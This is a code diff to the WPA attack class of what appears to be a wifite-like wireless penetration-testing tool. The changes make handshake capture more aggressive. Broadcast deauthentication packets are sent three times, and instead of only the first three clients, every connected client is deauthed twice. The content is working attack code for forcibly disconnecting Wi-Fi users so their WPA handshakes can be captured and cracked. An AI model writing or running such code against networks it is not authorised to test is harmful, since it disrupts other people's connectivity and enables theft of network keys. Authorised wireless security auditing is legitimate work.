@@ -249,6 +249,7 @@ class AttackWPA(Attack):
                     # Send deauth to a client or broadcast
                     if deauth_timer.ended():
                         try:
+                            # More aggressive deauth for stubborn networks
                             self.deauth(airodump_target)
                             # Restart timer
                             deauth_timer = Timer(Configuration.wpa_deauth_timeout)
@@ -387,26 +388,31 @@ class AttackWPA(Attack):
             return
 
         try:
-            # Send deauth to broadcast first (most effective)
+            # Send deauth to broadcast first (most effective) - send multiple times for stubborn APs
             Color.clear_entire_line()
             Color.pattack('WPA',
                     target,
                     'Handshake capture',
                     'Deauthing {O}*broadcast*{W}')
-            try:
-                Aireplay.deauth(target.bssid, client_mac=None, timeout=1)  # Reduced timeout
-            except Exception as e:
-                Color.pl('\n{!} {R}Error deauthing broadcast: {O}%s{W}' % str(e))
+            for i in range(3):  # Send 3 deauth packets for better chances
+                try:
+                    Aireplay.deauth(target.bssid, client_mac=None, timeout=1)
+                except Exception as e:
+                    if i == 0:  # Only show error on first attempt
+                        Color.pl('\n{!} {R}Error deauthing broadcast: {O}%s{W}' % str(e))
             
-            # Send deauth to individual clients (less frequent)
-            for client in self.clients[:3]:  # Limit to first 3 clients to avoid spam
+            # Send deauth to ALL clients (not just first 3) for better coverage
+            for client in self.clients:  # Deauth all clients for better success
                 Color.clear_entire_line()
                 Color.pattack('WPA',
                         target,
                         'Handshake capture',
                         'Deauthing {O}%s{W}' % client)
                 try:
-                    Aireplay.deauth(target.bssid, client_mac=client, timeout=1)  # Reduced timeout
+                    # Send 2 deauth packets per client for more aggressive approach
+                    Aireplay.deauth(target.bssid, client_mac=client, timeout=1)
+                    time.sleep(0.2)  # Small delay between packets
+                    Aireplay.deauth(target.bssid, client_mac=client, timeout=1)
                 except Exception as e:
                     Color.pl('\n{!} {R}Error deauthing {O}%s{R}: {O}%s{W}' % (client, str(e)))
                     continue
